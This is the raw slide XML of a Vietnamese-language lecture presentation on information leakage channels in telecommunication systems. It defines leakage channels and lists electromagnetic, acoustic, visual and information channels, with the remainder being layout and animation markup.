            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27653"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23374"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2819400" y="1921565"/>
            <a:ext cx="6866792" cy="3483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itle 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1855789" y="152400"/>
            <a:ext cx="648017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ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr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mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr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2pPr>
            <a:lvl3pPr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3pPr>
            <a:lvl4pPr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4pPr>
            <a:lvl5pPr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5pPr>
            <a:lvl6pPr marL="457200"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6pPr>
            <a:lvl7pPr marL="914400"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7pPr>
            <a:lvl8pPr marL="1371600"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8pPr>
            <a:lvl9pPr marL="1828800"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9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11728061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p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="338138"/>
            <a:ext cx="10260012" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> rò </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tin qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566275" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>rò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" err="1"/>
              <a:t>rỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tổ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hợp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gồm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nguồn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tin, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>môi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tín</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>mang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>tách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>khỏi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tín</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> hay </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Đối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin-viễn thông </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> chia </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>rỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>âm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thanh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ảnh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19520613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66275">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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66275">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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66275">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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66275">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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566275">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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566275">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>Kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>rò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>rỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> tin </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566275" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>K</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>ênh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nguyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>xuất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>này</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dòng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>chạy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>tố</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>móc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t> hệ thống. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>rường </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>làm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cảm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ứng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dòng</a:t>
            </a:r>
            <a:r>
